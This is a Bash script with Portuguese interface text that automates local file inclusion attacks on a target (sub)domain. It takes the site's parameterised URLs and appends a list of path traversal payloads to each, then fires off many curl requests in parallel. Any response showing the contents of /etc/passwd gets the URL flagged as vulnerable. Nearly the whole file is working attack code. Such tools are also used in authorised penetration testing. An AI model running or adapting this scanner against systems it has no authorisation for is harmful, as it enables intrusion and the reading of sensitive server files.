#!/bin/bash
cd ../;
pasta=$(pwd);

if [ -e $pasta"/scanner/"$1"/resultados/resultalfi" ];then

    sair=$(zenity --forms   \
        --title="SCANNER LFI -> LOCAL FILE INCLUSION" \
        --text="SCAN DESTE SUB[DOMÍNIO] JÁ REALIZADO!!" \
        --ok-label="OK"
    )
    exit;

else

	mkdir $pasta"/scanner/"$1"/resultados/resultalfi"

	for url in $(cat $pasta"/scanner/"$1"/resultados/"paramslimpos.txt);do
		arquivo=$(echo $url | sed 's/http.*.\/\///');

		for p in $(cat lfiPayloads.txt);do
        	echo 'curl --silent "'$url$p'" -v 2>&1 | grep "root:x:0:0:root:" && echo -e '$url'"\033[33;1m VULNERÁVEL A LFI\033[m" >> lfiResultado.txt &'>> $pasta"/scanner/"$1"/resultados/curlslfiMontados";
		done
	done

	mv $pasta"/scanner/"$1"/resultados/curlslfiMontados" $pasta"/scanner/"$1"/resultados/resultalfi/";
	cd $pasta"/scanner/"$1"/resultados/resultalfi";

	qtd=$(cat $pasta"/scanner/"$1"/resultados/resultalfi/curlslfiMontados" | wc -l);
	for (( i=0; i<=$qtd; i++ ));do
    	    echo -e "#!/bin/bash\n" >> "executa"$i".sh";

        	cat $pasta"/scanner/"$1"/resultados/resultalfi/curlslfiMontados" --number | grep " "$i | sed "s/ $i//" >> "executa"$i".sh";
	done

	echo -e "#!/bin/bash\n" >> executaTudo.sh;

	for arquivo in $(echo -e executa*.sh);do
		echo "./"$arquivo" &" >> executaTudo.sh;
	done

	chmod +x *.sh;

	cat executaTudo.sh | grep -v "./executaTudo.sh &" > rodaTudo.sh;

	rm executaTudo.sh;
	chmod +x rodaTudo.sh;
	./rodaTudo.sh;

	echo -e "\n\033[33;1mATENÇÃO, É RECOMENDADO EXECUTAR ESTA ONE-LINER ABAIXO APÓS ESTES PROCESSOS EM SEGUNDO PLANO SEREM EXECUTADOS!!\033[m";
	pasta=$(pwd);
	echo -e "\ncd "$pasta";cat *.txt > resultado.txt;mv resultado.txt ../;cd ../;rm -rf resulta;";
	echo -e "\nObservação: Esta One-Liner deve ser executada em: "$pasta;
fi
